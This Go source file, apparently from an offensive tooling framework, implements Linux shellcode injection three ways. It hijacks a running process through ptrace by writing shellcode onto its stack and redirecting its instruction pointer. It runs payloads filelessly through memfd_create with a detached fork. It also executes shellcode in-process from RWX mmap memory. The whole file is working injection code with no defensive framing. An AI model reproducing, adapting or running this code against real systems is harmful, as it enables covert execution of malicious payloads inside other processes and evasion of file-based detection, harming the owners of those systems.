//go:build linux && amd64

package inject

import (
	"fmt"
	"os"
	"runtime"
	"syscall"
	"unsafe"
)

type linuxInjector struct {
	config *Config
}

func newPlatformInjector(cfg *Config) (Injector, error) {
	if cfg == nil {
		return nil, fmt.Errorf("config is nil")
	}
	return &linuxInjector{config: cfg}, nil
}

func (l *linuxInjector) Inject(shellcode []byte) error {
	switch l.config.Method {
	case MethodPtrace:
		return l.injectPtrace(shellcode)
	case MethodMemFD:
		return l.injectMemFD(shellcode)
	case MethodProcMem:
		return l.injectProcMem(shellcode)
	default:
		return fmt.Errorf("unknown injection method for Linux: %s", l.config.Method)
	}
}

// injectPtrace uses ptrace for remote injection (x64).
func (l *linuxInjector) injectPtrace(shellcode []byte) error {
	if l.config.PID == 0 {
		return fmt.Errorf("PID required for ptrace injection")
	}

	pid := l.config.PID

	if err := syscall.PtraceAttach(pid); err != nil {
		return fmt.Errorf("PTRACE_ATTACH failed: %w (check ptrace_scope or permissions)", err)
	}
	defer syscall.PtraceDetach(pid)

	var ws syscall.WaitStatus
	_, err := syscall.Wait4(pid, &ws, 0, nil)
	if err != nil {
		return fmt.Errorf("wait4 failed: %w", err)
	}
	if !ws.Stopped() {
		return fmt.Errorf("process not stopped after attach")
	}

	var regs syscall.PtraceRegs
	if err := syscall.PtraceGetRegs(pid, &regs); err != nil {
		return fmt.Errorf("PTRACE_GETREGS failed: %w", err)
	}

	originalRSP := regs.Rsp

	shellcodeSize := (len(shellcode) + 15) &^ 15
	stackAddr := originalRSP - uint64(shellcodeSize) - 128
	stackAddr &^= 0xF

	for i := 0; i < len(shellcode); i += 8 {
		end := i + 8
		if end > len(shellcode) {
			end = len(shellcode)
		}
		chunk := shellcode[i:end]

		if len(chunk) < 8 {
			padded := make([]byte, 8)
			copy(padded, chunk)
			chunk = padded
		}

		addr := uintptr(stackAddr) + uintptr(i)

		_, err := syscall.PtracePokeData(pid, addr, chunk)
		if err != nil {
			return fmt.Errorf("PTRACE_POKEDATA failed at offset %d: %w", i, err)
		}
	}

	regs.Rip = stackAddr
	regs.Rsp = stackAddr - 8

	if err := syscall.PtraceSetRegs(pid, &regs); err != nil {
		return fmt.Errorf("PTRACE_SETREGS failed: %w", err)
	}

	if err := syscall.PtraceCont(pid, 0); err != nil {
		return fmt.Errorf("ptrace cont: %w", err)
	}

	return nil
}

// injectMemFD uses memfd_create for fileless execution.
func (l *linuxInjector) injectMemFD(shellcode []byte) error {
	nameBytes, _ := syscall.BytePtrFromString("")
	flags := 0

	fd, _, errno := syscall.Syscall(319, uintptr(unsafe.Pointer(nameBytes)), uintptr(flags), 0)
	if errno != 0 {
		return fmt.Errorf("memfd_create failed: %v (kernel >= 3.17 required)", errno)
	}
	defer syscall.Close(int(fd))

	_, err := syscall.Write(int(fd), shellcode)
	if err != nil {
		return fmt.Errorf("write to memfd failed: %w", err)
	}

	fdPath := fmt.Sprintf("/proc/self/fd/%d", fd)

	if err := os.Chmod(fdPath, 0755); err != nil {
		return fmt.Errorf("chmod memfd failed: %w", err)
	}

	_, err = syscall.ForkExec(fdPath, []string{fdPath}, &syscall.ProcAttr{
		Env:   os.Environ(),
		Files: []uintptr{0, 1, 2},
		Sys: &syscall.SysProcAttr{
			Setsid: true,
		},
	})
	if err != nil {
		return fmt.Errorf("ForkExec memfd failed: %w", err)
	}

	return nil
}

// injectProcMem uses mmap for self-injection.
func (l *linuxInjector) injectProcMem(shellcode []byte) error {
	mem, err := syscall.Mmap(
		-1, 0,
		len(shellcode),
		syscall.PROT_READ|syscall.PROT_WRITE|syscall.PROT_EXEC,
		syscall.MAP_ANONYMOUS|syscall.MAP_PRIVATE,
	)
	if err != nil {
		return fmt.Errorf("mmap failed: %w", err)
	}

	copy(mem, shellcode)

	shellcodeAddr := uintptr(unsafe.Pointer(&mem[0]))
	type shellcodeFunc func()
	execFunc := *(*shellcodeFunc)(unsafe.Pointer(&shellcodeAddr))

	go func() {
		runtime.LockOSThread()
		execFunc()
	}()

	return nil
}
